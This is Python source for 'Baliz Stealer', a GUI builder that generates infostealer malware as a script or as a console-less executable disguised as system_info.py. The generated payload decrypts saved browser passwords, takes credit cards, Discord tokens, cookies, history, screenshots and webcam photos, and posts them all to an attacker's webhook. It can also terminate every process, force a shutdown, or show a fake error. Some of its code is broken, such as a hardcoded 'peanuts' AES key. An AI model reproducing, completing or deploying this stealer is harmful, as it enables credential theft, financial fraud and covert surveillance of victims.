import customtkinter as ctk
from customtkinter import CTkImage
from PIL import Image
import requests
import os
import platform
import psutil
import socket
import json
import pyperclip
import pyautogui
import cv2
import subprocess
import tkinter as tk
from tkinter import simpledialog, messagebox
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class BalizStealer(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Baliz Builder")
        self.geometry("1090x1000")

        image_path = "asset/baliz.png"
        pil_image = Image.open(image_path)
        ctki_image = CTkImage(pil_image, size=(150, 150))

        self.logo_label = ctk.CTkLabel(self, image=ctki_image, text="")
        self.logo_label.image = ctki_image
        self.logo_label.pack(side="top", anchor="nw", padx=10, pady=10)

        self.main_title = ctk.CTkLabel(self, text="Baliz Stealer", font=("Arial", 82), text_color="red")
        self.main_title.pack(pady=(0, 30))

        self.webhook_label = ctk.CTkLabel(self, text="Webhook URL:")
        self.webhook_label.pack(pady=5)
        self.webhook_entry = ctk.CTkEntry(self, width=350)
        self.webhook_entry.pack(pady=5)
        self.test_webhook_btn = ctk.CTkButton(self, text="Test Webhook", command=self.test_webhook)
        self.test_webhook_btn.pack(pady=5)

        self.options_frame = ctk.CTkFrame(self)
        self.options_frame.pack(pady=10, fill="x", padx=20)

        self.options = {
            "System Info": ctk.BooleanVar(),
            "IP Info": ctk.BooleanVar(),
            "Clipboard": ctk.BooleanVar(),
            "Browsers List": ctk.BooleanVar(),
            "Antivirus List": ctk.BooleanVar(),
            "Downloads List": ctk.BooleanVar(),
            "Files on Desktop": ctk.BooleanVar(),
            "Screenshot": ctk.BooleanVar(),
            "Webcam Screen": ctk.BooleanVar(),
            "Wi-Fi SSID": ctk.BooleanVar(),
            "Kill All Programs": ctk.BooleanVar(),
            "Kill Discord Client": ctk.BooleanVar(),
            "Shutdown": ctk.BooleanVar(),
            "Fake Error": ctk.BooleanVar(),
            "Disconnect User": ctk.BooleanVar(),
            "Browsers Passwords": ctk.BooleanVar(),
            "Credit Cards": ctk.BooleanVar(),
            "Discord Token": ctk.BooleanVar(),
            "History": ctk.BooleanVar(),
            "Cookies": ctk.BooleanVar(),
            "Common Files": ctk.BooleanVar(),
        }

        rows = 3
        cols = 7

        row, col = 0, 0
        for name, var in self.options.items():
            checkbox = ctk.CTkCheckBox(self.options_frame, text=name, variable=var)
            checkbox.grid(row=row, column=col, sticky="nsew", padx=10, pady=10)
            col += 1
            if col >= cols:
                col = 0
                row += 1

        for i in range(rows):
            self.options_frame.grid_rowconfigure(i, weight=1)
        for j in range(cols):
            self.options_frame.grid_columnconfigure(j, weight=1)

        self.format_frame = ctk.CTkFrame(self)
        self.format_frame.pack(pady=20)

        self.format_label = ctk.CTkLabel(self.format_frame, text="Output Format:")
        self.format_label.grid(row=0, column=0, padx=10)

        self.format_option = ctk.CTkComboBox(self.format_frame, values=["Python (.py)", "Executable (.exe)"])
        self.format_option.grid(row=0, column=1, padx=10)

        self.generate_btn = ctk.CTkButton(self.format_frame, text="Build", command=self.generate_script)
        self.generate_btn.grid(row=0, column=2, padx=10)

        self.fake_error_title = ""
        self.fake_error_message = ""

    def test_webhook(self):
        url = self.webhook_entry.get()
        if not url.startswith("http"):
            self.show_message("Invalid Webhook")
            return
        try:
            response = requests.post(url, json={"content": "Webhook Test"})
            if response.status_code == 204:
                self.show_message("Webhook Valid")
            else:
                self.show_message("Invalid Webhook")
        except Exception as e:
            self.show_message(f"Error testing webhook: {e}")

    def generate_script(self):
        webhook = self.webhook_entry.get()
        selected_options = [name for name, var in self.options.items() if var.get()]
        if "Fake Error" in selected_options:
            self.get_fake_error_info()
        script_content = self.create_script_content(webhook, selected_options)
        output_format = self.format_option.get()

        if output_format == "Python (.py)":
            with open("baliz_stealer_file.py", "w", encoding="utf-8") as f:
                f.write(script_content)
            self.show_message("Python script generated successfully.")
        else:
            with open("system_info.py", "w", encoding="utf-8") as f:
                f.write(script_content)
            try:
                os.system("pyinstaller --onefile --noconsole system_info.py")
                self.show_message("Executable script generated successfully.")
            except Exception as e:
                self.show_message(f"Error during executable creation: {e}")

    def get_fake_error_info(self):
        root = tk.Tk()
        root.withdraw()
        self.fake_error_title = simpledialog.askstring("Error Title", "Enter the error title:")
        self.fake_error_message = simpledialog.askstring("Error Message", "Enter the error message:")

    def create_script_content(self, webhook, options):
        script_parts = []

        script_parts.append("""
import requests
import platform
import socket
import os
import psutil
import json
import pyperclip
import pyautogui
import cv2
import subprocess
import tkinter as tk
from tkinter import simpledialog
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

webhook = '{}'

def send_embed(title, fields):
    embed = {{
        "title": title,
        "color": 65280,
        "fields": fields
    }}
    try:
        requests.post(webhook, json={{"embeds": [embed]}})
    except Exception as e:
        print(f"Error sending embed: {{e}}")
""".format(webhook))

        if "System Info" in options:
            script_parts.append("""
def get_system_info():
    system_info = [
        {{"name": "Hostname", "value": socket.gethostname(), "inline": True}},
        {{"name": "OS", "value": f"{{platform.system()}} {{platform.release()}}", "inline": True}},
        {{"name": "CPU", "value": platform.processor(), "inline": False}},
        {{"name": "RAM", "value": f"{{round(psutil.virtual_memory().total / (1024**3), 2)}} GB", "inline": True}}
    ]
    send_embed("🖥️ System Info", system_info)
""")

        if "IP Info" in options:
            script_parts.append("""
def get_ip_info():
    try:
        ip_data = requests.get("https://ipinfo.io/json").json()
        ip_info = [
            {{"name": "IP", "value": ip_data.get("ip", "N/A"), "inline": True}},
            {{"name": "City", "value": ip_data.get("city", "N/A"), "inline": True}},
            {{"name": "Country", "value": ip_data.get("country", "N/A"), "inline": False}},
            {{"name": "ISP", "value": ip_data.get("org", "N/A"), "inline": False}}
        ]
        send_embed("🌍 IP Info", ip_info)
    except Exception as e:
        print(f"Error getting IP info: {{e}}")
""")

        if "Browsers List" in options:
            script_parts.append("""
def get_browsers_list():
    browsers = ["Chrome", "Firefox", "Edge"]
    installed = [b for b in browsers if any(os.path.exists(os.path.join(p, b)) for p in ["C:\\Program Files", "C:\\Program Files (x86)"])]
    send_embed("🌐 Browsers", [{{"name": "Installed", "value": ', '.join(installed), "inline": False}}])
""")

        if "Antivirus List" in options:
            script_parts.append("""
def get_antivirus_list():
    try:
        av = os.popen("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName").read()
        send_embed("🛡️ Antivirus", [{{"name": "Antivirus List", "value": av, "inline": False}}])
    except Exception as e:
        print(f"Error getting antivirus list: {{e}}")
""")

        if "Downloads List" in options:
            script_parts.append("""
def get_downloads_list():
    try:
        files = '\\n'.join(os.listdir(os.path.expanduser("~/Downloads"))[:10])
        send_embed("📂 Downloads", [{{"name": "Latest Files", "value": files, "inline": False}}])
    except Exception as e:
        print(f"Error getting downloads list: {{e}}")
""")

        if "Files on Desktop" in options:
            script_parts.append("""
def get_desktop_files():
    try:
        files = '\\n'.join(os.listdir(os.path.expanduser("~/Desktop"))[:10])
        send_embed("🖥️ Desktop Files", [{{"name": "Latest Files", "value": files, "inline": False}}])
    except Exception as e:
        print(f"Error getting desktop files: {{e}}")
""")

        if "Screenshot" in options:
            script_parts.append("""
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
    except Exception as e:
        print(f"Error taking screenshot: {{e}}")

def send_screenshot():
    take_screenshot()
    send_embed("📸 Screenshot", [{{"name": "Screenshot", "value": "screenshot.png", "inline": False}}])
""")

        if "Webcam Screen" in options:
            script_parts.append("""
def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam_photo.png", frame)
        cap.release()
    except Exception as e:
        print(f"Error taking webcam photo: {{e}}")

def send_webcam_photo():
    take_webcam_photo()
    send_embed("📷 Webcam Photo", [{{"name": "Photo", "value": "webcam_photo.png", "inline": False}}])
""")

        if "Wi-Fi SSID" in options:
            script_parts.append("""
def get_wifi_ssid():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        output = result.stdout
        ssid_line = [line for line in output.split('\\n') if "SSID" in line]
        if ssid_line:
            return ssid_line[0].split(":")[1].strip()
    except Exception as e:
        return str(e)

def send_wifi_ssid():
    ssid = get_wifi_ssid()
    send_embed("📶 Wi-Fi SSID", [{{"name": "SSID", "value": ssid, "inline": False}}])
""")

        if "Kill All Programs" in options:
            script_parts.append("""
def kill_all_programs():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            proc.terminate()
        except psutil.NoSuchProcess:
            pass
""")

        if "Kill Discord Client" in options:
            script_parts.append("""
def kill_discord():
    for proc in psutil.process_iter(['pid', 'name']):
        if "discord" in proc.name().lower():
            proc.terminate()
""")

        if "Shutdown" in options:
            script_parts.append("""
def shutdown():
    os.system("shutdown /s /f /t 1")
""")

        if "Fake Error" in options:
            script_parts.append(f"""
def fake_error():
    title = "{self.fake_error_title}"
    message = "{self.fake_error_message}"
    tk.messagebox.showerror(title, message)
""")

        if "Disconnect User" in options:
            script_parts.append("""
def disconnect_user():
    os.system('shutdown -l')
""")

        if "Browsers Passwords" in options:
            script_parts.append("""
def get_chrome_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for url, username, password in cursor.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(password)[1]
            yield url, username, password
        except Exception as e:
            print(f"Error decrypting password: {{e}}")
    conn.close()
    os.remove("Loginvault.db")

def get_firefox_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    for profile in profiles:
        path = os.path.join(profile, "logins.json")
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            logins = json.load(f)
            for login in logins["logins"]:
                url = login["hostname"]
                username = login["encryptedUsername"]
                password = login["encryptedPassword"]
                yield url, username, password

def get_edge_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for url, username, password in cursor.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(password)[1]
            yield url, username, password
        except Exception as e:
            print(f"Error decrypting password: {{e}}")
    conn.close()
    os.remove("Loginvault.db")

def get_browsers_passwords():
    passwords = []
    for url, username, password in get_chrome_passwords():
        passwords.append(f"Chrome - URL: {{url}}, Username: {{username}}, Password: {{password}}")
    for url, username, password in get_firefox_passwords():
        passwords.append(f"Firefox - URL: {{url}}, Username: {{username}}, Password: {{password}}")
    for url, username, password in get_edge_passwords():
        passwords.append(f"Edge - URL: {{url}}, Username: {{username}}, Password: {{password}}")
    send_embed("🔒 Browser Passwords", [{{"name": "Passwords", "value": '\\n'.join(passwords), "inline": False}}])
""")

        if "Credit Cards" in options:
            script_parts.append("""
def get_chrome_credit_cards():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "web-data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "web-data.db")
    conn = sqlite3.connect("web-data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT name_on_card, card_number_encrypted, origin FROM credit_cards")
    for row in cursor.fetchall():
        name_on_card = row[0]
        card_number_encrypted = row[1]
        origin = row[2]
        card_number = decrypt_data(card_number_encrypted)
        yield {{"name": name_on_card, "number": card_number, "origin": origin}}
    conn.close()
    os.remove("web-data.db")

def get_firefox_credit_cards():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    for profile in profiles:
        path = os.path.join(profile, "logins.json")
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            logins = json.load(f)
            for login in logins["logins"]:
                url = login.get("hostname", "N/A")
                username = login.get("encryptedUsername", "N/A")
                password = login.get("encryptedPassword", "N/A")
                yield {{"url": url, "username": username, "password": password}}

def decrypt_data(encrypted_data):
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        encrypted_data = encrypted_data[5:]
        iv = encrypted_data[:12]
        payload = encrypted_data[12:]
        key = b'peanuts'
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_data = cipher.decrypt(payload)
        return decrypted_data.decode()
    except Exception as e:
        print(f"Error decrypting data: {{e}}")
        return None

def get_credit_cards():
    credit_cards = []
    for card in get_chrome_credit_cards():
        credit_cards.append(f"Chrome - Name: {{card['name']}}, Number: {{card['number']}}, Origin: {{card['origin']}}")
    for card in get_firefox_credit_cards():
        credit_cards.append(f"Firefox - URL: {{card['url']}}, Username: {{card['username']}}, Password: {{card['password']}}")
    send_embed("💳 Credit Cards", [{{"name": "Credit Cards", "value": '\\n'.join(credit_cards), "inline": False}}])
""")

        if "Discord Token" in options:
            script_parts.append("""
def get_discord_token():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Discord", "Local Storage", "leveldb")
    if not os.path.exists(path):
        return None
    for file_name in os.listdir(path):
        if file_name.endswith(".log") or file_name.endswith(".ldb"):
            with open(os.path.join(path, file_name), "r", encoding="utf-8", errors="ignore") as file:
                for line in file:
                    if "token" in line and "}" in line:
                        parts = line.split('"token": "')
                        if len(parts) > 1:
                            token_part = parts[1].split('"')[0]
                            return token_part
    return None

def get_discord_info():
    discord_token = get_discord_token()
    if discord_token:
        send_embed("Discord Token \U0001F451", [{{"name": "Token", "value": discord_token, "inline": False}}])
    else:
        send_embed("Discord Token \U0001F451", [{{"name": "Token", "value": "Not Found", "inline": False}}])
""")

        if "History" in options:
            script_parts.append("""
def get_chrome_history():
    history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
    if not os.path.exists(history_path):
        return []
    shutil.copy2(history_path, "History.db")
    conn = sqlite3.connect("History.db")
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    history = cursor.fetchall()
    conn.close()
    os.remove("History.db")
    return history

def get_firefox_history():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    history = []
    for profile in profiles:
        path = os.path.join(profile, "places.sqlite")
        if not os.path.exists(path):
            continue
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
        history.extend(cursor.fetchall())
        conn.close()
    return history

def get_edge_history():
    history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
    if not os.path.exists(history_path):
        return []
    shutil.copy2(history_path, "History.db")
    conn = sqlite3.connect("History.db")
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    history = cursor.fetchall()
    conn.close()
    os.remove("History.db")
    return history

def get_history():
    history = []
    history.extend(get_chrome_history())
    history.extend(get_firefox_history())
    history.extend(get_edge_history())
    return "\\n".join([f"URL: {{h[0]}}, Title: {{h[1]}}, Last Visit: {{h[2]}}" for h in history])

def send_history():
    history = get_history()
    send_embed("History", [{{"name": "History", "value": history, "inline": False}}])
""")

        if "Cookies" in options:
            script_parts.append("""
def get_chrome_cookies():
    cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
    if not os.path.exists(cookies_path):
        return []
    shutil.copy2(cookies_path, "Cookies.db")
    conn = sqlite3.connect("Cookies.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    os.remove("Cookies.db")
    return cookies

def get_firefox_cookies():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    cookies = []
    for profile in profiles:
        path = os.path.join(profile, "cookies.sqlite")
        if not os.path.exists(path):
            continue
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value, expiry FROM moz_cookies")
        cookies.extend(cursor.fetchall())
        conn.close()
    return cookies

def get_edge_cookies():
    cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies")
    if not os.path.exists(cookies_path):
        return []
    shutil.copy2(cookies_path, "Cookies.db")
    conn = sqlite3.connect("Cookies.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    os.remove("Cookies.db")
    return cookies

def get_cookies():
    cookies = []
    cookies.extend(get_chrome_cookies())
    cookies.extend(get_firefox_cookies())
    cookies.extend(get_edge_cookies())
    return "\\n".join([f"Host: {{c[0]}}, Name: {{c[1]}}, Value: {{c[2]}}, Expires: {{c[3]}}" for c in cookies])

def send_cookies():
    cookies = get_cookies()
    send_embed("Cookies", [{{"name": "Cookies", "value": cookies, "inline": False}}])
""")

        if "Common Files" in options:
            script_parts.append("""
def get_common_files():
    common_files = []
    common_paths = [
        os.path.join(os.environ["USERPROFILE"], "Documents"),
        os.path.join(os.environ["USERPROFILE"], "Pictures"),
        os.path.join(os.environ["USERPROFILE"], "Music"),
        os.path.join(os.environ["USERPROFILE"], "Videos")
    ]
    for path in common_paths:
        if os.path.exists(path):
            common_files.extend(os.listdir(path)[:10])
    return "\\n".join(common_files)

def send_common_files():
    files = get_common_files()
    send_embed("Common Files", [{{"name": "Common Files", "value": files, "inline": False}}])
""")

        script_parts.append("""
if __name__ == "__main__":
""")

        for option in options:
            if option == "System Info":
                script_parts.append("    get_system_info()\n")
            elif option == "IP Info":
                script_parts.append("    get_ip_info()\n")
            elif option == "Browsers List":
                script_parts.append("    get_browsers_list()\n")
            elif option == "Antivirus List":
                script_parts.append("    get_antivirus_list()\n")
            elif option == "Downloads List":
                script_parts.append("    get_downloads_list()\n")
            elif option == "Files on Desktop":
                script_parts.append("    get_desktop_files()\n")
            elif option == "Screenshot":
                script_parts.append("    send_screenshot()\n")
            elif option == "Webcam Screen":
                script_parts.append("    send_webcam_photo()\n")
            elif option == "Wi-Fi SSID":
                script_parts.append("    send_wifi_ssid()\n")
            elif option == "Kill All Programs":
                script_parts.append("    kill_all_programs()\n")
            elif option == "Kill Discord Client":
                script_parts.append("    kill_discord()\n")
            elif option == "Shutdown":
                script_parts.append("    shutdown()\n")
            elif option == "Fake Error":
                script_parts.append("    fake_error()\n")
            elif option == "Disconnect User":
                script_parts.append("    disconnect_user()\n")
            elif option == "Browsers Passwords":
                script_parts.append("    get_browsers_passwords()\n")
            elif option == "Credit Cards":
                script_parts.append("    get_credit_cards()\n")
            elif option == "Discord Token":
                script_parts.append("    get_discord_info()\n")
            elif option == "History":
                script_parts.append("    send_history()\n")
            elif option == "Cookies":
                script_parts.append("    send_cookies()\n")
            elif option == "Common Files":
                script_parts.append("    send_common_files()\n")
            

        return ''.join(script_parts)

    def show_message(self, message):
        messagebox.showinfo("Info", message)

if __name__ == "__main__":
    app = BalizStealer()
    app.mainloop()
